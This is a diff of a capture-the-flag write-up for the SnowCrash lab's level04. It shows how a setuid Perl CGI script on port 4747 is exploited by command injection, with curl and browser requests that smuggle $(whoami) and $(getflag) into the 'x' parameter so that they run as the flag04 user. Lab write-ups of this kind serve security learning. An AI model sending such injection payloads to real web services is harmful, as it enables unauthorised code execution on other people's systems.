@@ -1,8 +1,20 @@
+-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
+
+level04.pl has special permissions for flag04
+
 there is a perl script running on port 4747, which prints a parameter 'x'
+This can be checked using netstat -tul (tcp, udp, listening)
 this allows execution of a command passed as a parameter
 
-curl localhost:4747?x='$(whoami)'
-returns "flag04" which means the requests to this server are made from flag04 user.
+level04@SnowCrash:~$ curl localhost:4747?x="$(whoami)"
+level04
+level04@SnowCrash:~$ curl localhost:4747?x='$(whoami)'
+flag04
+
+or in a browser 
+http://10.11.200.127:4747/?x=\%27$(getflag)\%27
+
+using interpolated strings, we get to execute code by the flag user
 
 if getflag gets evaluated from the script, which runs as user flag04,
 
